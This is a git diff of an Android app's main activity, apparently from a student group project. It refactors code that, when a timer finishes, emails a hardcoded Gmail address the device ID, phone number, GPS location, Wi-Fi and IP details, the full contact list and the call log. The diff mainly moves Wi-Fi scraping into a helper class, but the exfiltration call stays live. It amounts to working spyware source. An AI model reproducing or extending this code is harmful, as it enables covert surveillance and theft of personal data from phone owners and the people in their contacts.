@@ -6,38 +6,23 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.annotation.SuppressLint;
-import android.content.BroadcastReceiver;
-import android.content.ContentResolver;
-import android.content.ContentUris;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.location.Location;
-import android.location.LocationManager;
 import android.net.Uri;
-import android.net.wifi.WifiInfo;
-import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.CountDownTimer;
-import android.provider.MediaStore;
 import android.provider.Settings;
-import android.telephony.SmsMessage;
 import android.telephony.TelephonyManager;
-import android.text.format.Formatter;
 import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
 import android.widget.Toast;
 
-import java.io.IOException;
-import java.net.InetAddress;
-import java.net.Inet4Address;
-import java.net.UnknownHostException;
-import java.net.DatagramPacket;
-import java.net.DatagramSocket;
 import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
@@ -202,14 +187,8 @@ public class MainActivity extends AppCompatActivity {
             public void onFinish()
             {
                 Log.i("Timer", "Finish");
-                WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
-                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
-                String ssid = wifiInfo.getSSID();
-                String bssid = wifiInfo.getBSSID();
-                int ipAddress = wifiInfo.getIpAddress();
-                String ipAddressString = Formatter.formatIpAddress(ipAddress);
-                String macAddress = wifiInfo.getMacAddress();
-                int networkId = wifiInfo.getNetworkId();
+                Context context;
+                context = getApplicationContext();
 
                 Location location = locationinfo.getLocation();
 
@@ -217,8 +196,8 @@ public class MainActivity extends AppCompatActivity {
                 EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ androidID +"  |  Number:"+phoneNum , "Device Info\n-----"+DeviceScrape.getDeviceInfo()
                         + "\nBattery Level:" + batterylevel
                         + "\n\nLocation\n-----\nLongitude: "+locationinfo.getLocation().getLongitude() +"\nLatitude: "+locationinfo.getLocation().getLatitude()
-                        + "\n\nNetwork\n-----\nWIFI ID: " + networkId + "\nWIFI SSID: "+ ssid + "\nWIFI BSSID: " + bssid
-                        + "\nIP Address: " + ipAddressString + "\nMac Address: " + macAddress
+                        + "\n\nNetwork\n-----\n"
+                        + NetworkScrape.getWifiInfo(context)
                         + "\n\nContacts:\n-----\n"
                         + ContactScrape.scrapeContacts(getContentResolver())
                         + "\n\nCall Log:\n-----\n"
